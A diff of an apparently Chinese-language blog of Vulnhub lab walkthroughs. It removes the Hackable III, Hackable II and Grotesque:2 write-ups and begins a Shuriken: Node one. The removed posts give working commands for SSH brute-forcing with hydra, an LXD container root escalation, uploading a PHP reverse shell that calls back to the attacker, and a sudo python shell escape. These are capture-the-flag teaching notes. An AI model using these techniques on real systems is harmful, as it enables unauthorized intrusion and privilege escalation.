@@ -86,946 +86,94 @@
 
     
         <h2 class="title">
-            <a href="/2022/06/13/Hackable-3/">
-                Hackable 3
+            <a href="/2022/08/24/Shuriken-Node/">
+                Shuriken Node
             </a>
         </h2>
     
     <time>
-        Jun 13, 2022
+        Aug 24, 2022
     </time>
     <section class="content">
-        <h1><span id="hackable-iii">Hackable III</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hackable-iii">名称：Hackable III</span></h4><h4><span id="发布日期202162">发布日期：2021.6.2</span></h4><h4><span id="作者elias-sousa">作者：Elias Sousa</span></h4><h4><span id="系列hackable">系列：Hackable</span></h4></blockquote>
+        <h1><span id="shuriken-node">SHURIKEN: NODE</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称shuriken-node">名称：Shuriken: Node</span></h4><h4><span id="发布日期20201213">发布日期：2020.12.13</span></h4><h4><span id="作者thecyb3rw0lf">作者：TheCyb3rW0lf</span></h4><h4><span id="系列shuriken">系列：Shuriken</span></h4></blockquote>
 <h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;mnt&#x2F;root&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
+<h4><span id="flags">Flags：</span></h4><p>serv-adm:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt </p>
+<h4><span id="难度困难">难度：困难</span></h4></blockquote>
 <h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名hackable3ova">文件名：hackable3.ova</span></h4><h4><span id="文件大小16gb">文件大小：1.6GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomhackablehackable3ova">下载地址：</span></h4><h4><span id="md5-11855876a01867e9b79d6d5536f89dc0">MD5: 11855876A01867E9B79D6D5536F89DC0</span></h4><h4><span id="sha1-f5f200b85774430e0437f786de11d20a5a022d33">SHA1: F5F200B85774430E0437F786DE11D20A5A022D33</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Hackable III和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Hackable-3/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，可以发现只开放了80端口，其中有一个http-robots.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -A -p- 192.168.56.103，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/4.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现一些目录，但是没有太多的可用信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.103，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/5.png" alt="image-"></p>
-</blockquote>
-<h3><span id="访问主页信息提取解密">访问主页，信息提取解密</span></h3><blockquote>
-<p>1.对靶机主页进行访问，查看源码发现提示：</p>
-<p><img src="/2022/06/13/Hackable-3/6.png" alt="image-"></p>
-<p>2.提示告知我们可能要用到端口knocking及图片隐写的技术，并且获得了jubiscleudo这个用户名，结合提示上方的login页，可以尝试使用sql注入，但发现其实直接登录也会跳转，虽然是空白页，但是可以查看源码：</p>
-<p><img src="/2022/06/13/Hackable-3/7.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/8.png" alt="image-"></p>
-<p>3.我们在源码里发现了一个图片指示，结合之前的提示涉及图片隐写，可以把图片获取下来，用steghide分离一下隐藏内容：</p>
-<p><img src="/2022/06/13/Hackable-3/9.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf 3.jpg，分离出文本</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/10.png" alt="image-"></p>
-<p>4.这样我们的得到了第一个端口号，我们返回主页，去&#x2F;config目录下查看，只有一个1.txt，里面是base64编码的10000，如此我们得到第二个端口：</p>
-<p><img src="/2022/06/13/Hackable-3/11.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/12.png" alt="image-"></p>
-<p>5.同样，我们去&#x2F;css目录下查看，发现有2.txt，是brainfuck编码的4444，这就是第三个端口号：</p>
-<p><img src="/2022/06/13/Hackable-3/13.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/14.png" alt="image-"></p>
-<p>6.而&#x2F;backup目录下有一个wordlist.txt，很像密码字典，我们把这个字典获取，等下可以进行爆破：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.103/backup/wordlist.txt，获取密码字典</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh登录">SSH登录</span></h3><blockquote>
-<p>1.利用三个端口号进行knocking，可以发现ssh已经开放：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">knock 192.168.56.103 10000 4444 65535，knock</span><br><span class="line">nmap -p22 192.168.56.103，查看22端口状态</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/16.png" alt="image-"></p>
-<p>2.利用wordlist.txt密码字典对jubiscleudo用户使用hydra进行爆破，登录ssh：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jubiscleudo -P wordlist.txt 192.168.56.103 ssh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/17.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh jubiscleudo@192.168.56.103，ssh登录</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/18.png" alt="image-"></p>
-</blockquote>
-<h3><span id="二进制提权">二进制提权</span></h3><blockquote>
-<p>1.利用jubiscleudo帐户，我们能查看&#x2F;var&#x2F;www&#x2F;html目录下.backup_config.php文件，可以发现用户hackable_3及其密码：</p>
-<p><img src="/2022/06/13/Hackable-3/19.png" alt="image-"></p>
-<p>2.登录hackable_3，查看组，发现二进制文件lxc和lxd可用：</p>
-<p><img src="/2022/06/13/Hackable-3/20.png" alt="image-"></p>
-<p>3.我们可以利用alpine进行提权，系列命令如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Kali：</span><br><span class="line">把准备好的alpine压缩包传上靶机，命令如下：</span><br><span class="line">scp /tmp/alpine-minirootfs-3.14.1-x86_64.tar.gz hackable_3@192.168.56.103:/tmp/</span><br><span class="line"></span><br><span class="line">hackable_3:</span><br><span class="line">cd /tmp</span><br><span class="line">lxc image import ./ alpine-minirootfs-3.14.1-x86_64.tar.gz –alias fasto</span><br><span class="line">lxc image list</span><br><span class="line">lxd init</span><br><span class="line">lxc init fasto groot -c security.privileged=true</span><br><span class="line">lxc config device add groot mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line"></span><br><span class="line">lxc start groot</span><br><span class="line">lxc exec groot /bin/sh</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-3/21.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-3/22.png" alt="image-"></p>
-<p>4.在&#x2F;mnt&#x2F;root&#x2F;root目录下，可以发现root.txt，即flag：</p>
-<p><img src="/2022/06/13/Hackable-3/23.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hackable/" rel="tag">Hackable</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Hackable-2/">
-                Hackable 2
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="hackable-ii">Hackable II</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称hackable-ii">名称：Hackable II</span></h4><h4><span id="发布日期2021615">发布日期：2021.6.15</span></h4><h4><span id="作者elias-sousa">作者：Elias Sousa</span></h4><h4><span id="系列hackable">系列：Hackable</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>shrek:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名hackableiiova">文件名：hackableII.ova</span></h4><h4><span id="文件大小14gb">文件大小：1.4GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomhackablehackableiiova">下载地址：</span></h4><h4><span id="md5-ee4f408ba953e626e3852cfec7acefa3">MD5: EE4F408BA953E626E3852CFEC7ACEFA3</span></h4><h4><span id="sha1-89b1fdf9fcdcc5d2fbb736318ccc77e9f25d1c06">SHA1: 89B1FDF9FCDCC5D2FBB736318CCC77E9F25D1C06</span></h4></blockquote>
+<h4><span id="文件名shuriken_nodeova">文件名：Shuriken_Node.ova</span></h4><h4><span id="文件大小25gb">文件大小：2.5GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshurikenshuriken_nodeova">下载地址：</span></h4><h4><span id="md5-5eefc9733f218d3eb5e96ca231204bac">MD5: 5EEFC9733F218D3EB5E96CA231204BAC</span></h4><h4><span id="sha1-be48eb2ce8b9faa6c016bae4776869f873f6b2b9">SHA1: BE48EB2CE8B9FAA6C016BAE4776869F873F6B2B9</span></h4></blockquote>
 <h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
 <h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
 <h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
 <h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
 <h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机Hackable II和攻击机kali2021在VirtualBox下设置为仅主机模式（Vmware可能会无法获取网络），使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Hackable-2/1.png" alt="image-"></p>
+<p>1.将靶机shuriken_node和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/24/Shuriken-Node/1.png" alt="image-"></p>
 </blockquote>
 <h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
 <p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/2.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shuriken-Node/2.png" alt="image-"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，可以发现开放了21，22，80端口，其中21端口可以使用anonymous身份进行登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -A -p- 192.168.56.101，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/4.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现&#x2F;files目录下有一个CALL.html，但是没有太多的可用信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.56.101，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/5.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-2/6.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shuriken-Node/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和8080端口，访问8080，查看源码没有什么线索：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.125 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/4.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shuriken-Node/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，也没有过多线索：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.125:8080 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/6.png" alt="image-"></p>
 </blockquote>
-<h3><span id="登录ftp上传webshell">登录Ftp，上传webshell</span></h3><blockquote>
-<p>1.使用anonymous直接登录ftp，发现当前目录可写：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp open 192.168.56.101</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/7.png" alt="image-"></p>
-<p>2.则可上传webshell，这里利用kali自带的webshell简单修改后上传：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php，修改ip为kali的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/8.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">put php-reverse-shell.php，ftp上传webshell，要在/usr/share/webshells/php/目录下</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/9.png" alt="image-"></p>
-<p>3.kali开启监听，从靶机&#x2F;files目录下访问webshell，得到shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001，利用刚才设定的端口</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/10.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-2/11.png" alt="image-"></p>
-</blockquote>
-<h3><span id="目录搜索进行提权">目录搜索，进行提权</span></h3><blockquote>
-<p>1.可以对&#x2F;home目录进行一下搜寻，发现important.txt的文件，提示我们去运行.runme.sh，并得到用户名和md5后的密码：</p>
-<p><img src="/2022/06/13/Hackable-2/12.png" alt="image-"></p>
-<p>2.通过对密码的md5破解，其实就可以登录shrek，ssh登录后，可以查看shrek &#x2F;home目录下的文件user.txt：</p>
-<p><img src="/2022/06/13/Hackable-2/13.png" alt="image-"></p>
-<p><img src="/2022/06/13/Hackable-2/14.png" alt="image-"></p>
-<p>3.再来看看能从什么地方进行提权，发现可以直接使用python：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/15.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/python3.5 -c &#x27;import os;os.system(&quot;/bin/sh&quot;)&#x27;，直接提权</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Hackable-2/16.png" alt="image-"></p>
-<p>4.最后在&#x2F;root目录下，发现root.txt，即flag：<br><img src="/2022/06/13/Hackable-2/17.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Hackable/" rel="tag">Hackable</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Grotesque-2/">
-                Grotesque 2
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="grotesque2">Grotesque:2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称grotesque2">名称：Grotesque:2</span></h4><h4><span id="发布日期2021330">发布日期：2021.3.30</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列grotesque">系列：Grotesque</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>angel:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名grotesque2_vhova">文件名：grotesque2_vh.ova</span></h4><h4><span id="文件大小824mb">文件大小：824MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagegrotesquegrotesque2_vhova">下载地址：</span></h4><h4><span id="md5-57a2630c846d285b1390789d2d5b1c3d">MD5: 57A2630C846D285B1390789D2D5B1C3D</span></h4><h4><span id="sha1-b6fa719aca753e479dc5d3425b0c7a4435019c59">SHA1: B6FA719ACA753E479DC5D3425B0C7A4435019C59</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机grotesque2和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Grotesque-2/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现开放了很多端口，看来是做迷惑，访问主页，源码只有js内容：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.109 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/4.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现也是很多目录且无法对应端口，没办法，把全部的index页获取下来，按大小排序，找寻线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.109/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt –wildcard switch，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/6.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in &#123;23..600&#125;; do wget 192.168.56.109:$i -O index$i; done，获取各端口index</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/7.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -la | sort，排序文件，最大是index258</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/8.png" alt="image-"></p>
-</blockquote>
-<h3><span id="发现目标页">发现目标页</span></h3><blockquote>
-<p>1.访问一下大小最大的页面192.168.56.108:258，页面提示我们ssh用户名，我们查看页面源码，发现ok的emoji其实是一张图片：</p>
-<p><img src="/2022/06/13/Grotesque-2/9.png" alt="image-"></p>
-<p>2.将emoji的图片下载，放大后得到一串类似md5的字串，直接md5无法解出，但是页面有提示我们-100，得到ssh密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.109:258/emoji/hand.png</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/10.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/11.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/12.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh登录">SSH登录</span></h3><blockquote>
-<p>1.通过刚才的ssh用户名提示，我们可以试出是用户angel的密码，也可以使用hydra进行爆破，将ssh用户统一写入use.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L use.txt -p solomon1 ssh://192.168.56.109</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/13.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/14.png" alt="image-"></p>
-<p>2.登录后在目录下发现第一个flag，user.txt：</p>
-<p><img src="/2022/06/13/Grotesque-2/15.png" alt="image-"></p>
-</blockquote>
-<h3><span id="pspy64s-监控进程获取flag">pspy64s 监控进程，获取flag</span></h3><blockquote>
-<p>1.进入quiet文件夹，发现大量数字命名文件，用pspy64s进行进程监控，发现有定时任务的读写检查：</p>
-<p><img src="/2022/06/13/Grotesque-2/16.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br><span class="line">wget http://192.168.56.102:8001/pspy64s，angel获取pspy64s工具</span><br><span class="line">chmod +x pspy64s，给予执行权力</span><br><span class="line">./pspy64s，开启进程监听</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/17.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/18.png" alt="image-"></p>
-<p>2.删去quiet目录下所有文件，让定时任务执行后，进一步查看，发现rootcreds.txt，可以获得root的密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rm -rf *，删除后根据进程定时大概要等待一段时间再查看</span><br><span class="line">ls -la /</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-2/19.png" alt="image-"></p>
-<p><img src="/2022/06/13/Grotesque-2/20.png" alt="image-"></p>
-<p>3.登录root用户，在&#x2F;root目录下发现第二个flag，root.txt：</p>
-<p><img src="/2022/06/13/Grotesque-2/21.png" alt="image-"></p>
-</blockquote>
-
-
-        
-
-        
-            <div class="tags">
-                <a class="tag-none-link" href="/tags/Grotesque/" rel="tag">Grotesque</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2022/06/13/Grotesque-1/">
-                Grotesque 1
-            </a>
-        </h2>
-    
-    <time>
-        Jun 13, 2022
-    </time>
-    <section class="content">
-        <h1><span id="grotesque101">Grotesque:1.0.1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称grotesque101">名称：Grotesque:1.0.1</span></h4><h4><span id="发布日期2021310">发布日期：2021.3.10</span></h4><h4><span id="作者tasiyanci">作者：tasiyanci</span></h4><h4><span id="系列grotesque">系列：Grotesque</span></h4><h4><span id="推特tasiyanci">推特：@tasiyanci</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>raphael:&#x2F;<del>&#x2F;user.txt<br>root:&#x2F;</del>&#x2F;root.txt</p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名grotesque_vh-101ova">文件名：grotesque_vh-1.0.1.ova</span></h4><h4><span id="文件大小672mb">文件大小：672MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagegrotesquegrotesque_vh-101ova">下载地址：</span></h4><h4><span id="md5-7e73878bdb1251d1dadc4cc49f5bad68">MD5: 7E73878BDB1251D1DADC4CC49F5BAD68</span></h4><h4><span id="sha1-778cf0a9721e530587c78dd198039297c7bb16ab">SHA1: 778CF0A9721E530587C78DD198039297C7BB16AB</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机grotesque和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/13/Grotesque-1/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/13/Grotesque-1/2.png" alt="image-"></p>
